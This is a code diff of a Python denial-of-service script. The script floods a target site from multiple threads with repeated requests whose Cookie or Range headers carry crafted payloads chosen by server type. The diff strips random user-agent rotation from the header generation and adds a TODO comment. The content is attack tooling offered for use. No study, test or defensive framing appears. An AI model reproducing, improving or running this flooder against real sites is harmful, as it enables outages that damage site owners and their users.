@@ -27,17 +27,6 @@ def asciigen(size):
     result_str = ''.join(random.choice(string.ascii_uppercase) for i in range(size))
     return result_str
 
-def generate_ua():
-    with open('headeruseragents.txt', 'r') as r:
-        headerUseragents = r.read().replace(",", '').split()
-    return headerUseragents
-
-##Generate referers for apache
-def generate_referers():
-    with open('headersReferers.txt', 'r') as f:
-        referers = f.read().replace(",", '').split()
-    return referers
-
 ## Generate payload
 def generate_payload():
     if httpcall.ping.headers['server'] == 'Apache':
@@ -49,10 +38,10 @@ def generate_payload():
 def generate_headers(host):
     payload = "".join(generate_payload())
     if httpcall.ping.headers['server'] == 'Apache':
-        headers = { 'Host': host, 'User-Agent': random.choice(generate_ua()), 'Cookie': payload, 'Accept-Encoding': 'gzip, deflate, br'}
+        headers = { 'Host': host, 'Cookie': payload, 'Accept-Encoding': 'gzip, deflate, br'}
         return headers
     else:
-        headers = { 'Host': host, 'User-Agent': random.choice(generate_ua()), 'Range': payload, 'Accept-Encoding': 'gzip, deflate' }
+        headers = { 'Host': host, 'Range': payload, 'Accept-Encoding': 'gzip, deflate' }
         return headers
 
 ## sending requests to the site to get what method it uses
@@ -99,6 +88,7 @@ def method(DOS, url):
             sys.exit()
 
 def dos(DOS, url, repeat):
+
     try:
         for i in range(repeat):
             method(DOS, url)
@@ -108,7 +98,8 @@ def dos(DOS, url, repeat):
 def main(site, thread_count, quiet):
     if not quiet:
         asciiart()
-        
+
+        # TODO: change None, None to doser(), Encoder()
     dos_func = partial(dos, doser(), site, 500)
     threads = []
     for _ in range(thread_count):
@@ -127,3 +118,4 @@ if __name__ == "__main__":
     main(args["<site>"],
         int(args["--thread"]),
         args["--quiet"])
+
